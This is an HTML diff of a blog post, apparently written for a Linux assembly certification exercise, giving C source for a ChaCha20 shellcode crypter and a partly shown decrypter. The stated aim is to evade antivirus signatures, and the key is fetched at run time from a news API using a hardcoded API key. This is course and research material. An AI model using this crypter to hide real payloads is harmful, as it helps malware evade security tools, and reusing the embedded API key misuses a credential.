@@ -1,0 +1,654 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>SLAE 0x07: Crypter - tcunha.github.io</title>
+  <meta name="author" content="tcunha">
+
+  
+  <meta name="description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://tcunha.github.io/blog/2018/08/21/slae-0x07-crypter/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tcunha.github.io" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tcunha.github.io</a></h1>
+  
+    <h2>The lesson of history is that no one learns.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="tcunha.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">SLAE 0x07: Crypter</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2018-08-21T00:50:25+00:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2018</span></span> <span class='time'>12:50 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>This final exercise consists in using a custom crypter and decrypter to evade anti-virus engines, since signatures are used most of the time.</p>
+
+<p>They are both taking advantage of the <a href="https://wiki.openssl.org/index.php/EVP">EVP</a> functions provided by OpenSSL. The chosen algorithm was the <a href="https://cr.yp.to/chacha.html">ChaCha20</a> stream cipher with a random IV (12 bytes) and a key (32 bytes) retrieved on run-time. The key is the SHA256 of the <strong>id</strong> of the latest news of a <strong>configured</strong> section by using the public API provided by The Guardian.</p>
+
+<figure class='code'><figcaption><span>crypter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;openssl/conf.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/evp.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/rand.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &quot;common.h&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="n">STR</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">EVP_CIPHER_CTX</span>  <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">b</span><span class="p">[</span><span class="n">BUFSIZ</span><span class="p">];</span>     <span class="cm">/* Crypted buffer (should be enough). */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">iv</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>        <span class="cm">/* The IV length is 96 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">key</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>       <span class="cm">/* The key length is 256 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span>              <span class="n">bl</span><span class="p">,</span> <span class="n">ol</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">common_key</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>                                <span class="cm">/* Get dynamic key. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">RAND_bytes</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>             <span class="cm">/* Get a random IV. */</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">())</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_EncryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_chacha20</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_EncryptUpdate</span><span class="p">(</span>
+</span><span class='line'>      <span class="n">ctx</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bl</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ol</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Check for NUL bytes in the crypted shellcode. */</span>
+</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">!=</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span> <span class="o">+</span> <span class="n">ol</span><span class="p">)</span> <span class="p">{</span>    <span class="cm">/* Final buffer size is bl plus ol. */</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>          <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;NUL byte found!&quot;</span><span class="p">);</span> <span class="cm">/* There might be more! */</span>
+</span><span class='line'>      <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="n">key</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="n">key</span><span class="p">;</span> <span class="n">ptr</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x%02x&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Print the shellcode prefixed with the randomly generated IV. */</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">iv</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="n">iv</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">;</span> <span class="n">ptr</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x%02x&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span> <span class="o">+</span> <span class="n">ol</span><span class="p">;</span> <span class="n">ptr</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x%02x&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The common key retrieval code depends on cURL. Installing the header and library files, like with OpenSSL, is also needed:</p>
+
+<figure class='code'><figcaption><span>key retrieval</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;curl/curl.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;openssl/sha.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define COMMON_APIKEY           &quot;decfe466-4db7-4a7c-b0b8-f067cceaf94d&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_BASE             &quot;https:</span><span class="c1">//content.guardianapis.com&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_ENDPOINT         &quot;/search&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_ENDPOINT_ARGS    &quot;?section=science&amp;page-size=1&amp;api-key=&quot;</span>
+</span><span class='line'><span class="cp">#define COMMON_URL              \</span>
+</span><span class='line'><span class="cp">    COMMON_BASE                 \</span>
+</span><span class='line'><span class="cp">    COMMON_ENDPOINT             \</span>
+</span><span class='line'><span class="cp">    COMMON_ENDPOINT_ARGS        \</span>
+</span><span class='line'><span class="cp">    COMMON_APIKEY</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">size_t</span>
+</span><span class='line'><span class="nf">common_write</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nmemb</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">userdata</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span>    <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">userdata</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="n">BUFSIZ</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZ</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>         <span class="cm">/* Guarantee a NUL. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">nmemb</span> <span class="o">*</span> <span class="n">size</span><span class="p">);</span>          <span class="cm">/* Size is always 1; no overflow. */</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span>
+</span><span class='line'><span class="nf">common_key</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">CURL</span>            <span class="o">*</span><span class="n">curl</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span>            <span class="o">*</span><span class="n">end</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">const</span> <span class="kt">char</span>      <span class="o">*</span><span class="n">start</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span>             <span class="n">r</span><span class="p">[</span><span class="n">BUFSIZ</span><span class="p">];</span>     <span class="cm">/* Response (should be enough). */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_global_init</span><span class="p">(</span><span class="n">CURL_GLOBAL_ALL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_global_init&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">curl</span> <span class="o">=</span> <span class="n">curl_easy_init</span><span class="p">())</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_init&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_URL</span><span class="p">,</span> <span class="n">COMMON_URL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_setopt&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_WRITEFUNCTION</span><span class="p">,</span> <span class="n">common_write</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_perform&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_WRITEDATA</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_perform&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">curl_easy_perform</span><span class="p">(</span><span class="n">curl</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;curl_easy_perform&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Generate a key by finding the id and performing a SHA256 over it. */</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s">&quot;id&quot;</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;start not found&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">start</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>                             <span class="cm">/* Go over the attribute. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">end</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="sc">&#39;&quot;&#39;</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;end not found&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>                            <span class="cm">/* Turn it into a NUL byte. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* The key needs to be 32 bytes. */</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Generating key from: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">start</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">SHA256</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">start</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">start</span><span class="p">),</span> <span class="n">key</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>decrypter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;openssl/conf.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;openssl/evp.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &quot;common.h&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="n">STR</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">EVP_CIPHER_CTX</span>  <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">b</span><span class="p">[</span><span class="n">BUFSIZ</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">iv</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>        <span class="cm">/* The IV length is 96 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">key</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>       <span class="cm">/* The key length is 256 bits. */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="mi">12</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span>              <span class="n">bl</span><span class="p">,</span> <span class="n">ol</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">common_key</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>                        <span class="cm">/* Get dynamic key. */</span>
+</span><span class='line'>  <span class="n">memcpy</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">);</span>       <span class="cm">/* Save the prefixed IV. */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">())</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_chacha20</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_DecryptUpdate</span><span class="p">(</span>
+</span><span class='line'>      <span class="n">ctx</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bl</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="n">iv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">b</span> <span class="o">+</span> <span class="n">bl</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ol</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">CRYPTER_SSLERR</span><span class="p">();</span>
+</span><span class='line'>
